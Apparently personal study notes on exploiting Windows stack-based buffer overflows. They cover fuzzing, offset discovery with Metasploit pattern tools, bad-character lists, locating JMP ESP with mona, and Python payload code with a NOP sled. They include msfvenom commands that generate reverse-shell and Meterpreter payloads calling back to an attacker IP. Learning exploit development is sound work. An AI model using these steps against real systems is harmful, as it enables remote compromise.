# Author: Ali Taqi Wajid

<h1 style="text-align:center">Buffer Overflows</h1>

I might make some notes on each of these topics.

# Stack-Based Buffer Overflows
## Windows
- Firstly we need to fuzz the program to find the entry point.
- Then we have to found a rough close number that overflows the buffer.
- Then use pattern-create.rb from metasploit suite to create a pattern.
## Command:
`pattern-create.rb -l lenght`

Then, get the value of `EIP` using a debugger or something and then using pattern-offset.rb, we can get the offset.
## Command:
`pattern-offset.rb -l lenght -q <EIP address value>`
### Example:
`pattern-offset.rb -l 3000 -q 312565`

Now, we need to identify bad characters. To do that, we will have to send the bad chars. A list of badchars is as follows:
```python
badchars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

Now, once we send the badchars with payload, in immunity, we have to select esp and right click and follow in dump, copy the hex dump and then paste it in a file and then we can use our python script to make it easier for us to identify the bad characters one by one.

Now, we need to find module where ASLR/DEP isn't on. This can either be the .exe itself or a .DLL that is provided with it. We can do that by typing the following command in the immunity debugger:
```
!mona modules
```

Now, we need to find the opcode of `JMP ESP` that will allow us to later jump to our shell code. To do that, we firstly need to locate the nasm_shell. To do that:
```bash
locate nasm_shell
```

Now, we need to open this, we can easily do that using $() if we get a single output:
```bash
$(locate nasm_shell)
```

We can also get an error. I did too. In order to bypass that error, i used the following command:
```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
```
Now, we can see that the opcode is :
```
FFE4
```
Now, we need to go back in immunity, and then:
```
!mona find -s "\xff\xe4" -m <module_name>

## Example:
!mona find -s "\xff\xe4" -m essfunc.dll
```
Now, we need to right down the return addresses of the functions that we get from the result.
Consider the following return address:
`0x625014DF`
Now, due to the little endian, we need to write this address as follows for our script:
`\xDF\x14\50\x62`

Now, in immunity, we need to click on `bluish arrow` icon to jump to a certain address and we need to put this address in there. Then once we're at that address, we can press F2 to add a breakpoint there.

-> NOTE:
If you're not hitting the break point, try changing the python exploit script to look something like this:
```python
addr = b'\xDF\x14\x50\x62'
payload = 'A' * offset
payload = payload.encode()
payload += addr
```

We need to generate our shellcode now. To that, we will use msfvenom. The following command will generate a windows reverse shell:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.105 LPORT=9001 EXITFUNC=thread -f py -a x86 -b "\x00"

# -p -> payload
# LHOST = IP on which a nc will be running and the shell will be received on
# LPORT = PORT being listened on
# EXITFUNC -> makes the exploit stable.
# -f -> Filetype (C lang)
# -b -> bad characters
# Note, in -b, you have to add all the badchars that you found in the above stage.
```

-> For Meterpreter Session(Stable):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=9999 -f py -a x86 -b "\x00"\
````

-> Note: We also need to add nop sled ('\x90') between the jump address and the shellcode to ensure safety and add padding. A working nop sled with payload (without shellcode) will look like this:

```python
addr = b'\xDF\x14\x50\x62'
nops = '\x90' * 30
payload = 'A' * offset
payload = payload.encode()
nops = nops.encode()

payload += addr
payload += nops
payload += shell_code
```

-> Reason why we add NOPs: We can note the difference of between the address of ESP and then follow the data in dump and then we can see that between EIP and ESP there exists some bytes, so, within those bytes, we will add our NOPs. We add even more nops so that we can easily know that the shell code will definitely execute.

## Linux:
In Linux, we'll use GDB, the following few commands are very helpful:
```
cyclic <offset>
cyclic -l <4 byte from RSP>
```

# ASLR
# Stack Canaries
# DEP
# Heap-Based Buffer Overflows
# Examples
# Challenges
# Memory Corruption
# Exploit-Exercise Walkthroughs
# Python3 PWNTOOLS
# Other Binexp stuff